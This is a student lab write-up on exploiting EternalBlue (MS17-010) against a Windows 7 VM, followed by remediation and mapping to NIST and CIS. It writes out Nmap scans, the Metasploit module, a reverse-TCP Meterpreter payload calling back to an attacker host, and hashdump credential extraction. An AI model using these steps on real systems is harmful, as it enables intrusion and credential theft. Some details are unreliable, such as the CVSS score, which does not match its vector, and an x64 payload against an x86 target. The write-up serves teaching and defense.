# Case Study: Windows 7 SMB EternalBlue Exploitation (MS17-010)

## 1. Executive Summary

This case study documents a controlled penetration test against a vulnerable Windows 7 SP1 machine to demonstrate the impact of the MS17-010 (EternalBlue) SMB vulnerability. The objective was to simulate a real-world attacker exploiting an outdated and misconfigured Windows host, achieving remote code execution, establishing persistent access, and extracting sensitive information (such as SAM hashes) from the system.

The assessment successfully demonstrated full system compromise starting from basic network visibility checks, progressing through reconnaissance and scanning, exploitation with Metasploit, and post-exploitation activities using Meterpreter and Windows shell commands.

---

## 2. Lab Environment

### 2.1 Architecture Overview

- **Attacker Machine:** Kali Linux (running in VM)
- **Target Machine:** Windows 7 SP1 (unpatched, x86 architecture)
- **Hypervisor:** UTM (on macOS)
- **Base Host:** MacBook (ARM architecture)

Because Windows 7 x86 cannot run directly on ARM-based Mac hardware, a dedicated VM was created using UTM. Kali Linux was also run in a separate VM to simulate a realistic attacker-host scenario.

### 2.2 Network Topology

- Both VMs configured with:
  - NAT (Network Address Translation) or Bridged mode
  - Same virtual subnet to allow direct communication
- Verified connectivity using:
  - `ip addr` / `ifconfig` on Kali
  - `ipconfig` on Windows 7
  - `ping <target-ip>` from Kali to Windows

**Result:** Both machines were confirmed to be on the same subnet and able to communicate. Continuous ping responses validated stable network connectivity between the attacker and target.

---

## 3. Pre-Engagement & Scope

- **Scope:** Single Windows 7 SP1 VM within an isolated lab network
- **Goal:** Achieve remote code execution and extract sensitive information
- **Constraints:**
  - No impact on production systems
  - Only tools available in Kali Linux and standard Windows utilities
  - Controlled lab environment with proper authorization
- **Assumptions:**
  - Attacker has layer-3 network access to the target
  - Target is unpatched and running SMBv1

---

## 4. Methodology Overview

The engagement followed a standard penetration testing lifecycle aligned with PTES (Penetration Testing Execution Standard) and NIST CSF:

1. **Reconnaissance:** Identify live hosts and confirm connectivity
2. **Scanning:** Discover open ports and running services
3. **Enumeration:** Identify OS version and SMB vulnerabilities
4. **Exploitation:** Leverage EternalBlue (MS17-010) via Metasploit
5. **Post-Exploitation:** Gain shell, extract hashes, identify sensitive data
6. **Reporting:** Document impact, CVSS score, and remediation

---

## 5. Reconnaissance & Network Verification

### 5.1 Network Configuration on Kali

From Kali Linux terminal:
ifconfig
Identify the attacker IP address and network interface. Then confirm reachability of the Windows 7 host:
ping <windows7-ip>

### 5.2 Network Configuration on Windows 7

From Windows 7 Command Prompt (Admin):
ipconfig
ping <kali-ip>

**Results:**
- Both machines responded to ICMP echo requests
- Verified they are on the same subnet
- Confirmed bidirectional connectivity

**Significance:** This step is critical because both the OS (Attacker and Defender) need to communicate on the same network architecture for successful penetration testing. When the ping command runs successfully, it means both OSes are communicating without hindrance.

---

## 6. Firewall Configuration (Lab Conditions)

To ensure that the exploit traffic could reach the target, the Windows 7 firewall was temporarily disabled for the purpose of this controlled lab test.

**Steps Taken:**
1. Open **Control Panel → Windows Firewall**
2. Select **Turn Windows Firewall on or off**
3. Choose **Turn off Windows Firewall** for the active network profile

This allowed inbound SMB connections and exploit traffic from Kali.

**Important Note:** In real environments, this would be considered a critical misconfiguration and significantly increases risk. This step demonstrates how firewall weaknesses can be exploited.

---

## 7. Scanning & Enumeration with Nmap

### 7.1 Initial Port Scan (Basic SYN Scan)

From Kali Linux:
nmap -sS -Pn <windows7-ip>

**Nmap performs the following:**
- Scans the most common 1,000 TCP ports on the target IP
- Shows whether ports are open, closed, or filtered
- Does not identify services or operating systems (basic scan)

**Key Results:**
- Port **135/tcp** open (RPC - Remote Procedure Call)
- Port **139/tcp** open (NetBIOS-SSN - NetBIOS Session Service)
- Port **445/tcp** open (Microsoft-DS - SMB Protocol)

**Significance:** Nmap allows us to send packets to the desired device and discover open ports, which are then exploited. The presence of open SMB ports (139, 445) indicates potential vulnerability.

---

### 7.2 Version Detection & OS Fingerprinting

A more advanced and aggressive Nmap scan was executed to identify the OS and service versions and to check for known vulnerabilities:
sudo nmap -sV -O <windows7-ip>

**Nmap Options:**
- `-sV` enables service and version detection
  - Attempts to determine what services (e.g., Apache, SSH, MySQL) are running
  - Identifies version numbers of those services
- `-O` enables OS detection
  - Tries to guess the operating system of the target host
  - Uses TCP/IP stack fingerprinting
  - Requires sudo because OS detection needs raw packet privileges

**Output (Summarized):**
- OS detected: **Windows 7 SP1**
- SMB service flagged as **vulnerable to MS17-010 (EternalBlue)**
- Service version: Microsoft-DS SMBv1

**Significance:** This confirmed that the host was running an outdated SMBv1 service vulnerable to EternalBlue. The lack of patches and outdated protocol version made it an ideal target.

---

## 8. Exploitation with Metasploit Framework (EternalBlue)

### 8.1 Launching Metasploit Console

From Kali Linux:
msfconsole

Once in the Metasploit console (msf > prompt), search for EternalBlue-related modules:
search eternal

**What happens:**
- Metasploit lists available modules, exploits, and auxiliary tools related to the keyword "eternal"
- Typically referring to exploits from the NSA's Eternal series: EternalBlue, EternalRomance, etc.

---

### 8.2 Selecting the MS17-010 Exploit Module

From the search results, the relevant module is:
exploit/windows/smb/ms17_010_eternalblue

Select this module:
use exploit/windows/smb/ms17_010_eternalblue

**EternalBlue Overview:**
- **Codename:** EternalBlue (NSA's leaked exploit)
- **Vulnerability:** Critical flaw in Microsoft's SMBv1 protocol (Server Message Block)
- **Leaked:** By the Shadow Brokers in April 2017
- **Originally Developed:** By the NSA
- **Patched:** Microsoft MS17-010 update released March 2017
- **Affected Systems:** Windows XP through Windows 8.1, Server 2003-2012
- **CVSS Score:** 9.3 (Critical)

---

### 8.3 Setting Required Options

List the required and optional options:
show options

**Critical Parameter:**

| Option | Value | Purpose |
|--------|-------|---------|
| **RHOSTS** | `<windows7-ip>` | Target IP address (Remote Host) |
| **PAYLOAD** | `windows/x64/meterpreter/reverse_tcp` | Malicious code to execute on target |
| **LHOST** | `<kali-ip>` | Listener Host (your machine IP) |
| **LPORT** | `4444` | Listener Port (where meterpreter connects back) |

**Why RHOSTS is critical:**
- RHOST specifies the IP address of the target victim machine
- Metasploit uses this to know where to send the payload
- Without setting RHOSTS correctly, Metasploit won't know which machine to attack
- It's essential to correctly assign RHOSTS to the Windows 7 machine's IP

**Setting Options:**
set RHOSTS <windows7-ip>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <kali-ip>
set LPORT 4444

---

### 8.4 Running the Exploit

Execute the exploit:
exploit

**What Happens:**
1. Metasploit crafts the EternalBlue payload
2. Sends the exploit to the Windows 7 target via SMB port 445
3. The vulnerability is triggered on the target
4. Remote code execution is achieved
5. Meterpreter reverse shell is opened

**Result:**
- **Meterpreter session opened successfully**
- Connection established from target back to Kali
- Full system access achieved
- Ready for post-exploitation activities

---

## 9. Post-Exploitation Activities

Once the Meterpreter session was established, several post-exploitation steps were performed to demonstrate impact and extract sensitive information.

### 9.1 System Interaction via Meterpreter

List active sessions to verify the connection:
sessions
sessions -i 1

This shows all active Meterpreter sessions. Session 1 is the connection to the Windows 7 target.

**Capturing Screenshots from Target:**

Prove you have access to the victim's desktop:
SCREENSHOT

**Result:** Screenshot of the victim's Windows 7 desktop is displayed, showing:
- Desktop icons
- Taskbar
- Wallpaper
- Proof of system compromise

This demonstrates visual evidence of remote access.

---

### 9.2 Dropping to Windows Shell

To interact with the Windows command prompt on the target:
shell

This drops you into a Windows CMD prompt on the victim machine.

**From Windows CMD:**
cd C:\Users<username>\Desktop
dir
type flag.txt

**What This Does:**
- `cd` navigates to the Desktop folder
- `dir` lists files in the directory
- `type flag.txt` reads and displays the contents of flag.txt

**Result:**
- Successfully navigated the target file system
- Located and read sensitive files
- Confirmed arbitrary file access on the compromised system
- Demonstrated data exfiltration capability

**Significance:** This proves full access to the victim's file system. In a real scenario, attackers would extract credentials, configuration files, database backups, or other sensitive data.

---

### 9.3 Credential Extraction (SAM Hashes)

Back in Meterpreter session, extract password hashes from the Security Account Manager (SAM) database:
hashdump

**What Hashdump Does:**
- Extracts user account hashes from the Windows SAM database
- Retrieves NTLM password hashes for all local user accounts
- Allows offline password cracking or pass-the-hash attacks
- Proves access to sensitive authentication credentials

**Output (Example):**
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
<username>:1000:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::

**Significance:** These hashes can be:
- Used in pass-the-hash attacks
- Cracked offline with dictionary or brute-force attacks
- Used to access other systems on the network
- Proving credential compromise

---

## 10. Evidence & Complete Attack Timeline

**Attack Sequence:**

1. Verified network connectivity between Kali (attacker) and Windows 7 (target)
2. Confirmed Windows firewall was disabled - allowing exploit traffic
3. Ran initial Nmap scan - Identified open SMB ports (135, 139, 445)
4. Performed Nmap service/version detection - Identified Windows 7 SP1 with SMBv1
5. Confirmed vulnerability - Windows 7 SP1 is vulnerable to MS17-010 EternalBlue
6. Launched Metasploit Framework - msfconsole opened
7. Selected MS17-010 module - exploit/windows/smb/ms17_010_eternalblue
8. Set RHOSTS parameter - Configured target IP
9. Set payload and listeners - windows/x64/meterpreter/reverse_tcp, LHOST/LPORT
10. Executed exploit - Sent EternalBlue payload to target
11. Obtained Meterpreter session - Remote code execution successful
12. Captured victim desktop screenshot - Proof of visual access
13. Dropped to Windows shell - Gained command prompt on target
14. Navigated file system - Located and read sensitive files (flag.txt)
15. Executed hashdump - Extracted SAM password hashes
16. Documented results - Collected evidence and impact assessment

**Time to Exploitation:** Approximately 45 minutes from initial network discovery to full system compromise.

---

## 11. Vulnerability Analysis (MS17-010 / EternalBlue)

### 11.1 Technical Details

| Attribute | Details |
|-----------|---------|
| **CVE Identifier** | CVE-2017-0144 |
| **Vulnerability Name** | EternalBlue (SMBv1 Remote Code Execution) |
| **Component Affected** | Microsoft SMBv1 Protocol |
| **Type** | Remote Code Execution (RCE) |
| **Authentication Required** | No (unauthenticated attacker) |
| **Affected Systems** | Windows XP, Vista, 7, 8, 8.1, Server 2003, 2008, 2012, 2012 R2 |
| **Attack Vector** | Network (TCP port 445 - SMB) |
| **Patch Released** | March 14, 2017 (MS17-010) |
| **Impact** | Complete system compromise, RCE with system privileges |

### 11.2 CVSS v3 Scoring

**CVSS Base Score: 9.3 (CRITICAL)**

**Vector String:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

| Metric | Rating | Meaning |
|--------|--------|---------|
| **Attack Vector (AV:N)** | Network | Attacker can exploit from network without physical access |
| **Attack Complexity (AC:L)** | Low | No special conditions required |
| **Privileges Required (PR:N)** | None | Unauthenticated attacker can exploit |
| **User Interaction (UI:N)** | None | No user action needed |
| **Scope (S:U)** | Unchanged | Exploit affects only the target |
| **Confidentiality (C:H)** | High | Complete loss of confidentiality |
| **Integrity (I:H)** | High | Complete loss of integrity |
| **Availability (A:H)** | High | Complete loss of availability |

**Real-World Impact:** This vulnerability was the basis for the WannaCry ransomware outbreak (May 2017), which affected 150+ countries and caused billions in damages.

---

## 12. Business Impact

### 12.1 Potential Impact on Production Systems

If exploited on a production Windows server or workstation, MS17-010 could lead to:

| Impact Area | Consequence |
|------------|-------------|
| **Confidentiality** | Complete data exfiltration, theft of intellectual property, personal data |
| **Integrity** | System compromise, file modification, malware installation |
| **Availability** | Ransomware encryption, system shutdown, service disruption |
| **Compliance** | Regulatory violations (GDPR, HIPAA, PCI-DSS), legal liability |
| **Financial** | Ransom demands, recovery costs, business interruption losses |
| **Reputation** | Loss of customer trust, brand damage |
| **Lateral Movement** | Compromise of entire network if not segmented |

### 12.2 Demonstrated Impact in This Lab

This controlled assessment successfully demonstrated:

- **Unauthorized Access:** Gained system-level access to Windows 7
- **Credential Theft:** Extracted SAM password hashes
- **File Access:** Retrieved sensitive files from victim file system
- **Proof of Compromise:** Desktop screenshot proving visual access
- **Persistence Potential:** Ability to maintain access after reboot

---

## 13. Remediation & Hardening Recommendations

### 13.1 Immediate Actions (Critical)

**Apply MS17-010 Security Patch:**
- Ensure all Windows systems (XP through 2012 R2) are fully patched
- Microsoft KB4013389 (March 14, 2017) or later
- Verify patch installation: Check Windows Update history

**Disable SMBv1 Protocol:**
- Remove or disable SMBv1 wherever possible
- Command (PowerShell as Admin):
Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol
- Restart system after disabling

**Restore Firewall Protection:**
- Re-enable Windows Firewall immediately
- Configure inbound rules to restrict SMB access
- Block TCP ports 135, 139, 445 from untrusted networks

### 13.2 Network-Level Controls

**Network Segmentation:**
- Isolate critical systems and file servers from general network traffic
- Implement VLANs to segment by function or security level
- Use firewalls to restrict lateral movement

**SMB Port Restriction:**
- Block or filter SMB ports (135, 139, 445) at network perimeter
- Allow SMB only between authorized systems
- Monitor for unusual SMB traffic patterns

**Intrusion Detection:**
- Deploy IDS/IPS to detect EternalBlue exploitation attempts
- Monitor for suspicious SMB traffic: unusually large packets, rapid port scans
- Alert on:
- Connection attempts to port 445
- SMB vulnerability probes
- Metasploit modules execution signatures

### 13.3 Endpoint Hardening

**User Account Management:**
- Enforce least privilege access (disable local admin rights for regular users)
- Implement multi-factor authentication (MFA) for administrative accounts
- Regularly audit user privileges and remove unnecessary access

**Credential Management:**
- Regularly rotate administrative credentials
- Use unique, complex passwords
- Implement Password Hash Synchronization (PHS) or Pass-Through Authentication (PTA)
- Monitor for credential compromise

**Endpoint Detection & Response (EDR):**
- Deploy EDR tools (CrowdStrike, SentinelOne, Microsoft Defender ATP)
- Monitor for:
- Unusual process execution
- Suspicious network connections
- Registry modifications
- Lateral movement attempts

### 13.4 Monitoring & Detection

**Windows Event Logging:**
- Enable enhanced audit logging:
- Logon events (4624, 4625)
- Process creation (4688)
- Network connection (5156, 5157)
- Account modifications (4720-4722)

**Log Analysis & SIEM:**
- Centralize logs in SIEM (Splunk, ELK Stack, Wazuh)
- Create alerts for:
- Failed logon attempts (threshold: 5+ in 5 minutes)
- Admin account usage outside business hours
- Process creation from TEMP directories
- Unexpected network outbound connections

**Threat Hunting:**
- Regularly hunt for indicators of compromise (IoCs)
- Search for EternalBlue exploitation signatures
- Monitor for post-exploitation activity (hashdump, credential access)

---

## 14. Mapping to Security Frameworks

### 14.1 NIST Cybersecurity Framework Mapping

| CSF Function | Remediation Alignment |
|--------------|----------------------|
| **Identify** | Asset inventory of all Windows systems, patch management database |
| **Protect** | Apply MS17-010 patches, disable SMBv1, implement network segmentation |
| **Detect** | IDS/IPS monitoring, log aggregation, threat intelligence feeds |
| **Respond** | Incident response procedures, containment protocols, eradication playbooks |
| **Recover** | System restoration from clean backups, business continuity plans |

**Detailed Mapping:**

**Identify Functions:**
- Maintain up-to-date inventory of all systems running Windows
- Track OS versions and patch levels
- Map network topology and identify critical assets

**Protect Functions:**
- Implement patch management process (test → deploy → verify)
- Enforce Windows Firewall policies via Group Policy
- Apply principle of least privilege to user accounts
- Segment network by security zone

**Detect Functions:**
- Monitor port 445 for unusual activity
- Alert on failed authentication attempts
- Track SMB vulnerability scan signatures
- Monitor for Metasploit framework indicators

**Respond Functions:**
- Contain infected systems (network isolation)
- Gather forensic evidence
- Eradicate malware and restore systems
- Communicate with stakeholders

**Recover Functions:**
- Restore from clean backups (taken before compromise)
- Verify patch installation post-recovery
- Re-enable security controls
- Test and validate restored systems

### 14.2 CIS Controls Mapping

| CIS Control | Implementation |
|------------|-----------------|
| **Control 2** | Secure configuration (disable SMBv1, apply patches, harden OS) |
| **Control 4** | Secure configuration of enterprise assets (patch management) |
| **Control 7** | Vulnerability management (regular scanning, patch prioritization) |
| **Control 12** | Boundary defense (firewall rules, network segmentation) |
| **Control 13** | Data protection (encrypt sensitive data, restrict access) |
| **Control 16** | Account management (least privilege, credential protection) |
| **Control 17** | Implement a security awareness and training program |
| **Control 20** | Penetration testing and red team exercises |

---

## 15. Lessons Learned

### 15.1 Technical Insights

1. **Legacy Systems Are High-Risk:**
 - Unpatched systems are exploitable within minutes
 - Older protocols (SMBv1) have fundamental design flaws
 - The longer a system runs without patches, the higher the risk

2. **Configuration Matters:**
 - Disabled firewalls make exploitation trivial
 - Default configurations are often insecure
 - Regular security audits can identify misconfigurations

3. **Network Visibility is Critical:**
 - Simple tools (Nmap) quickly identify attack surfaces
 - Service enumeration reveals vulnerability windows
 - Attackers use the same tools and techniques defenders should know

4. **Post-Exploitation Access is Valuable:**
 - Once RCE is achieved, full system access follows
 - Credential extraction enables lateral movement
 - File access allows data exfiltration

### 15.2 Organizational Insights

1. **Patch Management is Non-Negotiable:**
 - Even critical vulnerabilities go unpatched in production
 - Business pressure to maintain uptime delays patching
 - Automated patch deployment with proper testing can mitigate this

2. **Segmentation Limits Blast Radius:**
 - If SMB was restricted to a specific VLAN, compromise would not spread
 - Network segmentation should reflect security zones, not just departments
 - Zero-trust networking can prevent lateral movement

3. **Monitoring Detects Attacks Early:**
 - EDR tools would flag the Meterpreter shell execution
 - SIEM alerts on hashdump activity
 - Early detection enables faster containment

4. **Defense-in-Depth is Essential:**
 - Single point of failure (firewall down) led to complete compromise
 - Multiple controls at different layers (patch + firewall + EDR) provide resilience
 - Assume breaches will happen; focus on rapid detection and response

---

## 16. Conclusion

This case study successfully demonstrated end-to-end exploitation of a vulnerable Windows 7 SP1 system using the EternalBlue (MS17-010) vulnerability. Starting from basic network reconnaissance, the engagement proceeded through systematic scanning, vulnerability identification, exploitation, and impactful post-exploitation activities.

### Key Takeaways:

1. **The vulnerability is real and critical:** CVSS 9.3 reflects the true danger. WannaCry proved this at scale.

2. **Exploitation is straightforward:** With known exploits (Metasploit), attackers need minimal skill to compromise unpatched systems.

3. **Prevention is achievable:** Patches, firewall rules, protocol disabling, and proper configuration prevent exploitation.

4. **Detection matters:** Monitoring systems and networks can identify compromise even when prevention fails.

5. **Preparation saves lives:** Backup and recovery planning minimize impact of successful attacks.

### Recommendations for PwC Clients:

- **Immediate:** Patch all systems affected by MS17-010; disable SMBv1 enterprise-wide
- **Short-term:** Implement network segmentation and firewall rules
- **Medium-term:** Deploy EDR tools and SIEM for continuous monitoring
- **Long-term:** Establish patch management discipline and security culture

---

## 17. Appendix: Tools & Commands Reference

**Reconnaissance:**
nmap -sS -Pn <target-ip> # Basic port scan
nmap -sV -O <target-ip> # Version detection + OS fingerprinting

**Exploitation:**
msfconsole # Launch Metasploit
search eternal # Search for EternalBlue modules
use exploit/windows/smb/ms17_010_eternalblue # Select exploit
set RHOSTS <target-ip> # Set target
set LHOST <attacker-ip> # Set listener
exploit # Run exploit

**Post-Exploitation:**
sessions # List active sessions
sessions -i 1 # Interact with session 1
screenshot # Capture target desktop
shell # Drop to Windows shell
hashdump # Extract SAM hashes

---

*All activities documented in this case study were conducted in a controlled lab environment with proper authorization. No live production systems were targeted. This assessment is for educational and training purposes only.*

**Last Updated:** December 2025  
**Author:** Shivam Kumar  
**Organization:** GD Goenka University, Cybersecurity Specialization
